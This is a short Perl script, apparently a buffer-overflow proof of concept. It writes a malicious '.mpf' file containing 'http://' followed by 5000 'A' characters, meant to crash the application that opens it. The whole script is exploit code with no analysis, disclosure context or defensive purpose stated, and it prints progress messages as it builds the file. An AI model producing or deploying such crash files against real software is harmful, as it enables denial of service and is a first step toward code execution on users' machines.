#!/usr/bin/perl

my $sploitfile="c0d3r.mpf";

my $sploitfile="c0d3r.mpf";
my $junk = "http://";
$junk=$junk."A"x5000;
my $payload=$junk;
print " [+] Writing exploit file $sploitfile\n";
open (myfile,">$sploitfile");
print myfile $payload;close (myfile);
print " [+] File written\n";
print " [+] " . length($payload)." bytes\n";
